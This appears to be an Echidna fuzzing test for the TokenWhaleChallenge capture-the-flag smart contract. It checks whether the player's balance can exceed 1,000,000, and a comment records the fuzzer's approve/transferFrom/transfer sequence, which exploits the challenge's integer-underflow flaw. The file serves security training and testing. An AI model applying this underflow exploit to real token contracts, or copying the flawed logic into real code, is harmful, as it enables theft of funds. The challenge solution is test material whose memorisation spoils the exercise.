// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.7.5;

import "../src/TokenWhaleChallenge.sol";


/// @dev Run the template with
///      ```
///      solc-select use 0.7.5
///      echidna EchidnaTest/TokenWhaleChallenge_solution.sol --contract TestTokenWhaleChallenge --test-mode assertion
///      
///      ```
contract TestTokenWhaleChallenge is TokenWhaleChallenge {

    constructor() TokenWhaleChallenge(msg.sender) {

    }
    function echidna_test_balance() public view returns (bool) {
        return balanceOf[player] < 1000000;
    }


    /**
    
    
    approve(0x20000,999999) from: 0x0000000000000000000000000000000000030000 Time delay: 344203 seconds Block delay: 45261
    transferFrom(0x30000,0x2fffffffd,311) from: 0x0000000000000000000000000000000000020000 Time delay: 82670 seconds Block delay: 54155
    transfer(0x30000,20689003013171632852637063791460183102704924456558202297686681966678098512573) from: 0x0000000000000000000000000000000000020000 Time delay: 407328 seconds Block delay: 55538
    
    
    
    
     */
   
}